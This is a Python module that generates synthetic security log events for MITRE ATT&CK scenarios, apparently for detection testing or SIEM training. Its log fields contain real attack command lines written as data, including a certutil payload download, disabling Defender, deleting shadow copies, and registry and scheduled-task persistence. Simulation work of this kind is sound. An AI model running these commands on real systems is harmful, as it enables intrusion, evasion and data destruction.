from typing import Dict, Any, List
from datetime import datetime
import uuid
import random

class AttackSimulator:
    def __init__(self):
        pass

    def get_scenarios(self) -> List[Dict[str, str]]:
        return [
            {"id": "t1059", "name": "PowerShell Encoded Command", "mitre": "T1059.001"},
            {"id": "t1110", "name": "Brute Force Login Attack", "mitre": "T1110"},
            {"id": "t1134", "name": "Privilege Escalation via PsExec", "mitre": "T1134"},
            {"id": "t1047", "name": "Lateral Movement via WMI", "mitre": "T1047"},
            {"id": "t1003", "name": "Credential Dumping via Mimikatz", "mitre": "T1003"},
            {"id": "t1547", "name": "Persistence via Registry Run Keys", "mitre": "T1547"},
            {"id": "t1053", "name": "Scheduled Task Persistence", "mitre": "T1053"},
            {"id": "t1562", "name": "Defense Evasion by Disabling Defender", "mitre": "T1562"},
            {"id": "t1071", "name": "Suspicious DNS Beaconing", "mitre": "T1071"},
            {"id": "t1046", "name": "Network Scanning Activity", "mitre": "T1046"},
            {"id": "t1105", "name": "Suspicious File Download via Certutil", "mitre": "T1105"},
            {"id": "t1041", "name": "Data Exfiltration Simulation", "mitre": "T1041"},
            {"id": "t1486", "name": "Ransomware File Encryption Behavior", "mitre": "T1486"},
            {"id": "ssh_brute_force", "name": "SSH Brute Force Attack", "mitre": "T1110.001"},
        ]

    def _generate_base_log(self) -> Dict[str, Any]:
        return {
            "timestamp": datetime.utcnow().isoformat(),
            "event_type": "sysmon",
            "severity": "high",
            "raw_data": '{"Source": "Microsoft-Windows-Sysmon"}',
        }

    def simulate_attack(self, scenario_id: str) -> List[Dict[str, Any]]:
        logs = []
        base_log = self._generate_base_log()
        
        if scenario_id == "t1059":
            base_log.update({
                "event_id": "1",
                "process_name": "powershell.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "ip_address": "127.0.0.1",
                "details": {
                    "command_line": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
                    "parent_process": "cmd.exe"
                }
            })
            logs.append(base_log)
        elif scenario_id == "t1110":
            for _ in range(5):
                log = self._generate_base_log()
                log.update({
                    "event_id": "4625",
                    "event_type": "security",
                    "process_name": "winlogon.exe",
                    "user": "admin",
                    "ip_address": "192.168.1.100",
                    "details": {
                        "logon_type": 3,
                        "status": "0xc000006d"
                    }
                })
                logs.append(log)
        elif scenario_id == "t1003":
             base_log.update({
                "event_id": "10",
                "process_name": "lsass.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "details": {
                    "target_image": "C:\\Windows\\system32\\lsass.exe",
                    "granted_access": "0x1fffff",
                    "call_trace": "C:\\Windows\\SYSTEM32\\ntdll.dll"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1047":
             base_log.update({
                "event_id": "1",
                "process_name": "wmic.exe",
                "user": "DOMAIN\\Admin",
                "details": {
                    "command_line": "wmic /node:192.168.1.50 process call create \"cmd.exe /c echo laterally moved > C:\\temp\\pwn.txt\"",
                    "parent_process": "cmd.exe"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1547":
             base_log.update({
                "event_id": "13",
                "process_name": "reg.exe",
                "user": "WIN-PC\\User",
                "details": {
                    "target_object": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
                    "details": "C:\\temp\\malicious.exe"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1134":
             base_log.update({
                "event_id": "1",
                "process_name": "PSEXESVC.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "details": {
                    "command_line": "PSEXESVC.exe",
                    "parent_process": "services.exe"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1053":
             base_log.update({
                "event_id": "1",
                "process_name": "schtasks.exe",
                "user": "DOMAIN\\Admin",
                "details": {
                    "command_line": "schtasks /create /tn \"WindowsUpdateProxy\" /tr \"C:\\temp\\malicious.exe\" /sc onlogon",
                    "parent_process": "cmd.exe"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1562":
             base_log.update({
                "event_id": "1",
                "process_name": "powershell.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "details": {
                    "command_line": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
                    "parent_process": "cmd.exe"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1071":
             base_log.update({
                "event_id": "22",
                "process_name": "malware.exe",
                "user": "WIN-PC\\User",
                "details": {
                    "query_name": "c2-update.malicious-domain.xyz",
                    "query_status": "0",
                    "query_results": "192.0.2.1"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1046":
             base_log.update({
                "event_id": "3",
                "process_name": "nmap.exe",
                "user": "WIN-PC\\User",
                "details": {
                    "destination_ip": "192.168.1.0/24",
                    "destination_port": "445",
                    "protocol": "tcp"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1105":
             base_log.update({
                "event_id": "1",
                "process_name": "certutil.exe",
                "user": "WIN-PC\\User",
                "details": {
                    "command_line": "certutil.exe -urlcache -split -f http://192.0.2.50/payload.exe C:\\temp\\payload.exe",
                    "parent_process": "cmd.exe"
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1041":
             base_log.update({
                "event_id": "3",
                "process_name": "powershell.exe",
                "user": "WIN-PC\\User",
                "details": {
                    "destination_ip": "198.51.100.22",
                    "destination_port": "443",
                    "protocol": "tcp",
                    "bytes_sent": 5432100
                }
            })
             logs.append(base_log)
        elif scenario_id == "t1486":
             base_log.update({
                "event_id": "1",
                "process_name": "vssadmin.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "details": {
                    "command_line": "vssadmin.exe delete shadows /all /quiet",
                    "parent_process": "cmd.exe"
                }
            })
             logs.append(base_log)
        elif scenario_id == "ssh_brute_force":
            attacker_ip = "45.132.89.201"
            targets = ["production-server-01", "api-gateway-us-east", "db-cluster-node-3"]
            
            # Step 1 & 2: Search Failed Logins (Multiple Attempts)
            for _ in range(12):
                host = random.choice(targets)
                log = self._generate_base_log()
                log.update({
                    "event_id": "4625", # Consistent with other brute force logic
                    "event_type": "ssh_auth_failure",
                    "process_name": "sshd",
                    "user": random.choice(["root", "admin", "ubuntu", "user"]),
                    "ip_address": attacker_ip,
                    "severity": "medium",
                    "details": {
                        "message": f"Failed SSH Login: Invalid password for user {random.choice(['root','admin'])} from {attacker_ip}",
                        "host": host,
                        "port": 22
                    }
                })
                logs.append(log)
                
            # Final Successful Login
            success_log = self._generate_base_log()
            success_log.update({
                "event_id": "4624",
                "event_type": "ssh_auth_success",
                "process_name": "sshd",
                "user": "root",
                "ip_address": attacker_ip,
                "severity": "critical",
                "details": {
                    "message": f"SSH Login: Accepted password for root from {attacker_ip} port 22 ssh2",
                    "host": "production-server-01",
                    "port": 22
                }
            })
            logs.append(success_log)
        # Add basic stubs for any undefined ones just in case
        else:
             base_log.update({
                "event_id": "9999",
                "process_name": "unknown_malware.exe",
                "details": {
                    "message": f"Simulated execution for {scenario_id}"
                }
             })
             logs.append(base_log)
             
        # Add stringified raw data for frontend viewing
        import json
        for log in logs:
            log["raw_data"] = json.dumps(log)
            
        return logs

attack_simulator = AttackSimulator()
